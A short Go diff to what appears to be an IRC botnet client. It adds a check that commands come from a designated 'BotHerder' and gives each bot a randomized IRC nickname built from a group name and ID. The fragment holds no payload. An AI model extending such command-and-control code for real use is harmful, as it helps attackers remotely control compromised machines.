@@ -30,6 +30,14 @@ func Find(read, str string) bool {
 	return strings.Contains(read, str)
 }
 
+func setupComd(args int, cut string) string {
+	return strings.Trim(Recv(*BotReader, args), cut)
+}
+
+func (b *Bot) AccessPerms() bool {
+	return Find(Recv(*BotReader, 0), b.BotHerder)
+}
+
 func (b *Bot) Send(str string) {
 	fmt.Fprintf(b.IRC, "%s\r\n", str)
 }
@@ -40,11 +48,11 @@ func (b *Bot) Report(str string) {
 
 func (b *Bot) Join() {
 	rand.Seed(time.Now().UnixNano())
-	id := rand.Intn(1000000)
-	group := genName('A')
+	BotGroup = genName('A')
+	BotID = fmt.Sprint(rand.Intn(10000000))
 
-	user := fmt.Sprint("USER ["+b.BotTag+"][", group, "][", id, "]", " 8 * :bot")
-	nick := fmt.Sprint("NICK ["+b.BotTag+"][", group, "][", id, "]")
+	user := fmt.Sprint("USER ["+b.BotTag+"][", BotGroup, "][", BotID, "]", " 8 * :bot")
+	nick := fmt.Sprint("NICK ["+b.BotTag+"][", BotGroup, "][", BotID, "]")
 
 	b.Send(user)
 	b.Send(nick)
